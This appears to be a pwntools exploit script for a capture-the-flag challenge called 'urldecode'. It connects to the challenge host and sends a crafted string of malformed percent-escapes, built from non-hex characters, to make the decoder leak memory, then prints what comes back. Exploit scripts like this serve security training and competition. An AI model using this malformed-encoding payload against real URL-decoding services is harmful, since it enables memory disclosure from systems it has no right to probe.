#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./demo2 --host 127.0.0.1 --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./attachments/urldecode")

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "urldecode.q.2024.ugractf.ru"
port = int(args.PORT or 9279)


def local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(["edb", "--run", exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(["qira", exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments


def gen_string(readlen, start):
    s = b""
    for i in range(readlen, start, -1):
        low_byte = i % 16
        high_byte = i // 16

        bytesord = b""" !"#$%&'()*+,-./0"""[::-1]

        pseudehex = (
            b"%"
            + bytesord[high_byte : high_byte + 1]
            + bytesord[low_byte : low_byte + 1]
        )

        s += pseudehex
    return s


io = start()

if args.TOKEN:
    io.sendline(args.TOKEN)

io.recvuntil(b"Enter a string to decode")

pl = gen_string(48, 4)
log.info(f"Payload: {pl}")
# pl = b"%" + b"00" * 100
io.sendline(pl)

# io.recvuntil(b"Decoding:")


# data = io.recvuntil(b"Decoded:")
# log.info(f"Data: {data}")

res = ""
while True:
    try:
        data = io.recvline()
        if data == b"":
            break
        res += data.decode().replace("\n", "")
    except:
        break
# data = io.recvall()
# print(data)

log.success(f"Result: {res}")

# io.interactive()
io.close()